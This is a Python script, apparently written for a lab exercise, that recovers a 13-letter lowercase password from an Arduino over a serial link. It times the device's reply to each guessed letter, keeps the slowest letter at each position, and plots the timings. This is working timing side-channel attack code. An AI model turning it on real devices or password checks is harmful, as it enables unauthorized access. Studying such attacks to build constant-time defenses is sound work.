import serial 
import string
import time 
import matplotlib.pyplot as plt

# At the end, we plot a graph to figure out what letter took the most time for a specific index on the password string.
# This is that index. For instance, if we want to plot a graph showing the attempted characters and their times for the first character, we set this to 0
CHAR_INDEX_TO_PLOT=2

arduino = serial.Serial(port='/dev/ttyUSB0', baudrate=115200, timeout=0.1)
time.sleep(5)

attempt = "aaaaaaaaaaaaa"
possible_char = string.ascii_lowercase

# This is a list of dictionaries. Each dictionary will map an index to a list of tuples.
# These tuples map what character was attempted for index X, and how long did that test take.
testsTimes = []

for i in range(13):
    biggest_time = 0
    testsTimes.append({i: []})
    for char in possible_char:
        attemptAsList = list(attempt)
        
        attemptAsList[i] = char

        attempt = ''.join(attemptAsList) 
        
        print(attempt)
        print(arduino.readline())

        arduino.write(bytes(attempt+"\n", 'utf-8'))
        initTime = time.time()

        while arduino.in_waiting == 0:
            pass

        endTime = time.time()
        
        delta = endTime - initTime
        print(delta)

        testsTimes[i][i].append((char,delta))

        data = arduino.readline()

        print(data)
        if delta > biggest_time:
            biggest_time = delta
            next_char = char
    
    attemptAsList = list(attempt)
    attemptAsList[i] = next_char
    attempt = ''.join(attemptAsList) 
    
    print(f"Letra nº{i+1} que demorou mais: {next_char}")

print(f"pass: {attempt}")

# Plot for the first character of the string
plotData = testsTimes[CHAR_INDEX_TO_PLOT][CHAR_INDEX_TO_PLOT]
chars = []
times = []
for item in plotData:
    chars.append(item[0])
    times.append(item[1])

plt.plot(chars,times)
plt.xlabel(f'Attempted character for position {CHAR_INDEX_TO_PLOT}')
plt.ylabel('Time')
plt.show()
